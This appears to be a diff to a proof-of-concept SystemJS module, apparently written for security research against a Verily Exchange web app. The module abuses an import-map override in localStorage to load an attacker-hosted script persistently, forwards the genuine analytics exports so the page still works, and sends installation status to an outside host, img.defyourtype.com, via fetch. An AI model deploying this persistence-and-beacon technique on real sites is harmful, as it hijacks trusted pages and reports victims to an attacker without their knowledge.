@@ -7,7 +7,7 @@ System.register([], function (_export) {
   const genuineModule =
     "https://exchange.pre.verily.com/mfe/analytics?file=verily-analytics.js";
   const persistentSource =
-    "https://cdn.jsdelivr.net/gh/defyourtype/defyourtype.com@15b1ff7a1ec3522418aac9bd8bef4a5c4ab875e0/silver-pine-52d8-runtime.js";
+    "https://cdn.jsdelivr.net/gh/defyourtype/defyourtype.com@81ba20b22798d4d8675f0d9311649bc0543cb1f1/silver-pine-52d8-runtime.js";
   const endpoint = "https://img.defyourtype.com/x/silver-pine-52d8.txt";
 
   const reportInstall = () => {
@@ -16,6 +16,9 @@ System.register([], function (_export) {
     }
 
     const storageKey = `import-map-override:${moduleName}`;
+    const catalogItems = document.querySelectorAll(
+      '[data-testid="featured-card"], [data-testid="listing-card"], [data-testid="listing-row"]',
+    ).length;
     const result = {
       marker,
       stage: "installer",
@@ -23,7 +26,7 @@ System.register([], function (_export) {
       installed: localStorage.getItem(storageKey) === persistentSource,
       persistentSource,
       genuineExportsForwarded: true,
-      listingRows: document.querySelectorAll('[data-testid="listing-row"]').length,
+      catalogItems,
     };
     window.__silverPineInstallerProof = result;
 
@@ -34,7 +37,7 @@ System.register([], function (_export) {
       `Trusted origin: ${result.origin}`,
       `Persistent module stored: ${result.installed}`,
       `Genuine analytics exports forwarded: ${result.genuineExportsForwarded}`,
-      `Catalog rows still rendered: ${result.listingRows}`,
+      `Catalog items still rendered: ${result.catalogItems}`,
       "Next proof: visit the clean Exchange URL with no query string.",
     ].join("\n");
     Object.assign(panel.style, {
@@ -61,7 +64,7 @@ System.register([], function (_export) {
       origin: result.origin,
       installed: String(result.installed),
       genuineExportsForwarded: String(result.genuineExportsForwarded),
-      listingRows: String(result.listingRows),
+      catalogItems: String(result.catalogItems),
     });
     fetch(`${endpoint}?${query}`, {
       mode: "no-cors",
